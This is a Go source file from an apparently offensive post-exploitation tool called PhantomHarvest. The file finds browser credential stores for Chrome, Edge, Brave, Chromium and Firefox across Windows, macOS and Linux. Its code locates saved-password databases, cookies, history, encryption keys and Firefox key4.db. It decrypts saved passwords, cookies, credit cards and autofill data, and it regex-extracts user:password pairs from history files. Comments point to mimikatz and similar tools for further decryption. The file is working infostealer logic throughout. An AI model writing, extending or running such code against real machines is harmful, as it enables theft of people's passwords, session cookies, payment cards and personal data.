package harvest

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"

	"github.com/phantom-offensive/PhantomHarvest/internal/decrypt"
)

// Browser profile paths by OS
type browserProfile struct {
	name    string
	paths   []string // relative to user home
	loginDB string   // SQLite file for saved passwords
	histDB  string   // SQLite file for history
	cookieDB string  // SQLite file for cookies
}

func getBrowserProfiles() []browserProfile {
	if runtime.GOOS == "windows" {
		return []browserProfile{
			{
				name: "Chrome",
				paths: []string{
					"AppData/Local/Google/Chrome/User Data/Default",
					"AppData/Local/Google/Chrome/User Data/Profile 1",
					"AppData/Local/Google/Chrome/User Data/Profile 2",
					"AppData/Local/Google/Chrome/User Data/Profile 3",
					"AppData/Local/Google/Chrome/User Data/Profile 4",
				},
				loginDB: "Login Data", histDB: "History", cookieDB: "Cookies",
			},
			{
				name: "Edge",
				paths: []string{
					"AppData/Local/Microsoft/Edge/User Data/Default",
					"AppData/Local/Microsoft/Edge/User Data/Profile 1",
					"AppData/Local/Microsoft/Edge/User Data/Profile 2",
				},
				loginDB: "Login Data", histDB: "History", cookieDB: "Cookies",
			},
			{
				name: "Brave",
				paths: []string{
					"AppData/Local/BraveSoftware/Brave-Browser/User Data/Default",
				},
				loginDB: "Login Data", histDB: "History", cookieDB: "Cookies",
			},
			{
				name: "Firefox",
				paths: []string{
					"AppData/Roaming/Mozilla/Firefox/Profiles",
				},
				loginDB: "logins.json", histDB: "places.sqlite", cookieDB: "cookies.sqlite",
			},
		}
	}

	if runtime.GOOS == "darwin" {
		return []browserProfile{
			{
				name: "Chrome",
				paths: []string{"Library/Application Support/Google/Chrome/Default"},
				loginDB: "Login Data", histDB: "History", cookieDB: "Cookies",
			},
			{
				name: "Chromium",
				paths: []string{"Library/Application Support/Chromium/Default"},
				loginDB: "Login Data", histDB: "History", cookieDB: "Cookies",
			},
			{
				name: "Brave",
				paths: []string{"Library/Application Support/BraveSoftware/Brave-Browser/Default"},
				loginDB: "Login Data", histDB: "History", cookieDB: "Cookies",
			},
			{
				name: "Edge",
				paths: []string{"Library/Application Support/Microsoft Edge/Default"},
				loginDB: "Login Data", histDB: "History", cookieDB: "Cookies",
			},
			{
				name: "Firefox",
				paths: []string{"Library/Application Support/Firefox/Profiles"},
				loginDB: "logins.json", histDB: "places.sqlite", cookieDB: "cookies.sqlite",
			},
		}
	}

	// Linux paths
	return []browserProfile{
		{
			name: "Chrome",
			paths: []string{
				".config/google-chrome/Default",
				".config/google-chrome/Profile 1",
			},
			loginDB: "Login Data", histDB: "History", cookieDB: "Cookies",
		},
		{
			name: "Chromium",
			paths: []string{".config/chromium/Default"},
			loginDB: "Login Data", histDB: "History", cookieDB: "Cookies",
		},
		{
			name: "Firefox",
			paths: []string{".mozilla/firefox"},
			loginDB: "logins.json", histDB: "places.sqlite", cookieDB: "cookies.sqlite",
		},
		{
			name: "Brave",
			paths: []string{".config/BraveSoftware/Brave-Browser/Default"},
			loginDB: "Login Data", histDB: "History", cookieDB: "Cookies",
		},
	}
}

// scanBrowsers checks for browser credential databases and history.
func (s *Scanner) scanBrowsers() {
	homes := findHomeDirs(s.root)
	profiles := getBrowserProfiles()

	for _, home := range homes {
		for _, browser := range profiles {
			for _, relPath := range browser.paths {
				profileDir := filepath.Join(home, relPath)

				// For Firefox, enumerate profile subdirectories
				if browser.name == "Firefox" && (strings.Contains(relPath, "Profiles") || strings.Contains(relPath, "firefox")) {
					s.scanFirefoxProfiles(profileDir, browser)
					continue
				}

				// Check for Login Data (saved passwords)
				loginPath := filepath.Join(profileDir, browser.loginDB)
				if _, err := os.Stat(loginPath); err == nil {
					decrypted := false
					if s.DecryptBrowsers {
						decrypted = s.decryptChromiumProfile(profileDir, browser.name)
					}
					if !decrypted {
						s.extractChromiumLogins(loginPath, browser.name)
					}
				}

				// Check for History (URLs with auth)
				histPath := filepath.Join(profileDir, browser.histDB)
				if _, err := os.Stat(histPath); err == nil {
					s.extractBrowserHistory(histPath, browser.name)
				}

				// Check for Cookies
				cookiePath := filepath.Join(profileDir, browser.cookieDB)
				if _, err := os.Stat(cookiePath); err == nil {
					s.addFinding(Finding{
						Category:   "Browser",
						Type:       "cookie_db",
						File:       cookiePath,
						Key:        browser.name + " Cookies",
						Value:      "(session cookies database — extract with tools)",
						Confidence: ConfMedium,
					})
				}
			}
		}
	}
}

// decryptChromiumProfile invokes the decrypt package and converts results
// into harvest.Findings. Returns true if at least one decrypted finding was
// produced (in which case the discovery-only fallback is skipped).
func (s *Scanner) decryptChromiumProfile(profileDir, browserName string) bool {
	if !decrypt.Enabled() {
		fmt.Fprintln(os.Stderr, "[!] Decryption support not compiled in. Rebuild with: make build-full")
		return false
	}
	results, err := decrypt.DecryptChromiumProfile(profileDir, browserName)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] decrypt %s: %v\n", browserName, err)
		return false
	}
	any := false
	for _, d := range results {
		if d.Type == "saved_password" || d.Type == "cookie" || d.Type == "credit_card" || d.Type == "autofill" {
			any = true
		}
		// Route decrypted autofill (plaintext PII from Web Data.sqlite:
		// addresses, phones, form history, etc.) into its own category
		// so the Browser block stays focused on passwords/cookies/card
		// findings while autofill gets its own bordered table.
		category := d.Category
		if d.Type == "autofill" {
			category = "Browser Autofill"
		}
		s.addFinding(Finding{
			Category: category, Type: d.Type, File: d.File,
			Key: d.Key, Value: d.Value, Confidence: d.Confidence,
		})
	}
	return any
}

// decryptFirefoxProfile invokes the decrypt package for a Firefox profile.
func (s *Scanner) decryptFirefoxProfile(profileDir, browserName string) bool {
	if !decrypt.Enabled() {
		fmt.Fprintln(os.Stderr, "[!] Decryption support not compiled in. Rebuild with: make build-full")
		return false
	}
	results, err := decrypt.DecryptFirefoxProfile(profileDir, browserName)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] decrypt %s: %v\n", browserName, err)
		return false
	}
	any := false
	for _, d := range results {
		if d.Type == "saved_password" {
			any = true
		}
		s.addFinding(Finding{
			Category: d.Category, Type: d.Type, File: d.File,
			Key: d.Key, Value: d.Value, Confidence: d.Confidence,
		})
	}
	return any
}

// scanFirefoxProfiles enumerates Firefox profile directories.
func (s *Scanner) scanFirefoxProfiles(profilesDir string, browser browserProfile) {
	entries, err := os.ReadDir(profilesDir)
	if err != nil {
		return
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		profDir := filepath.Join(profilesDir, entry.Name())

		// Check for logins.json (Firefox stores creds in JSON, encrypted with NSS)
		loginsPath := filepath.Join(profDir, "logins.json")
		if _, err := os.Stat(loginsPath); err == nil {
			if s.DecryptBrowsers && s.decryptFirefoxProfile(profDir, browser.name) {
				continue
			}
			s.addFinding(Finding{
				Category:   "Browser",
				Type:       "firefox_logins",
				File:       loginsPath,
				Key:        "Firefox Saved Passwords",
				Value:      "(encrypted with NSS — decrypt with firefox_decrypt.py)",
				Confidence: ConfHigh,
			})
		}

		// Check for key4.db (Firefox master key database)
		keyPath := filepath.Join(profDir, "key4.db")
		if _, err := os.Stat(keyPath); err == nil {
			s.addFinding(Finding{
				Category:   "Browser",
				Type:       "firefox_key_db",
				File:       keyPath,
				Key:        "Firefox Master Key DB",
				Value:      "(key4.db — needed to decrypt logins.json)",
				Confidence: ConfHigh,
			})
		}

		// History
		histPath := filepath.Join(profDir, "places.sqlite")
		if _, err := os.Stat(histPath); err == nil {
			s.extractBrowserHistory(histPath, "Firefox")
		}
	}
}

// extractChromiumLogins detects and reports Chromium Login Data databases.
// Passwords are encrypted with DPAPI (Windows) or system keyring (Linux).
// Use tools like: SharpChromium, HackBrowserData, or mimikatz to decrypt.
func (s *Scanner) extractChromiumLogins(dbPath, browserName string) {
	info, err := os.Stat(dbPath)
	if err != nil {
		return
	}

	tool := "HackBrowserData or SharpChromium"
	if runtime.GOOS == "windows" {
		tool = "mimikatz dpapi::chrome or SharpChromium"
	}

	s.addFinding(Finding{
		Category:   "Browser",
		Type:       "login_db",
		File:       dbPath,
		Key:        browserName + " Saved Passwords",
		Value:      fmt.Sprintf("(%d KB — decrypt with %s)", info.Size()/1024, tool),
		Confidence: ConfHigh,
	})

	// Also check for Local State (contains the encryption key)
	localStatePath := filepath.Join(filepath.Dir(filepath.Dir(dbPath)), "Local State")
	if _, err := os.Stat(localStatePath); err == nil {
		s.addFinding(Finding{
			Category:   "Browser",
			Type:       "encryption_key",
			File:       localStatePath,
			Key:        browserName + " Encryption Key",
			Value:      "(Local State — contains encrypted_key for password decryption)",
			Confidence: ConfHigh,
		})
	}
}

// extractBrowserHistory detects browser history databases and scans raw bytes
// for URLs with embedded credentials (no SQLite driver needed).
func (s *Scanner) extractBrowserHistory(dbPath, browserName string) {
	info, err := os.Stat(dbPath)
	if err != nil {
		return
	}

	s.addFinding(Finding{
		Category:   "Browser",
		Type:       "history_db",
		File:       dbPath,
		Key:        browserName + " History",
		Value:      fmt.Sprintf("(%d KB — extract with sqlite3 or BrowserHistoryView)", info.Size()/1024),
		Confidence: ConfMedium,
	})

	// Quick scan of raw bytes for credential URLs (user:pass@host). The
	// browser's History SQLite is stored uncompressed so URL strings
	// appear as plaintext — no sqlite driver needed.
	data, err := os.ReadFile(dbPath)
	if err != nil || len(data) > 50*1024*1024 { // Skip > 50MB
		return
	}

	// Strict regex: scheme://user:pass@host.tld where each piece only
	// contains URL-safe printable ASCII of sensible length, and the host
	// ends in a real-looking TLD (2-24 alpha chars). The old loose
	// pattern was greedy-matching arbitrary binary blobs in SQLite pages
	// and flagging every browsing-history URL as a HIGH credential.
	authURLRe := regexp.MustCompile(`https?://([a-zA-Z0-9._~+-]{2,32}):([a-zA-Z0-9._~!$&*+=%-]{4,64})@([a-zA-Z0-9][a-zA-Z0-9.-]{1,63}\.[a-zA-Z]{2,24})`)
	matches := authURLRe.FindAllStringSubmatch(string(data), 50)
	seen := map[string]bool{}
	for _, match := range matches {
		if len(match) < 4 {
			continue
		}
		user, pass, host := match[1], match[2], match[3]
		// Reject generics / placeholders.
		if isNoisy(pass) || isNoisy(user) {
			continue
		}
		// A "password" containing a slash, space, or quote is almost
		// certainly a path segment matched accidentally.
		if strings.ContainsAny(pass, "/\\ '\"<>`") {
			continue
		}
		// Reject cases where user == pass (e.g. noise like "abc:abc").
		if user == pass {
			continue
		}
		// Deduplicate within this file.
		key := user + "|" + host
		if seen[key] {
			continue
		}
		seen[key] = true
		s.addFinding(Finding{
			Category:   "Browser",
			Type:       "auth_url",
			File:       dbPath,
			Key:        user + "@" + host,
			Value:      fmt.Sprintf("%s:%s", user, pass),
			Confidence: ConfHigh,
		})
	}
}
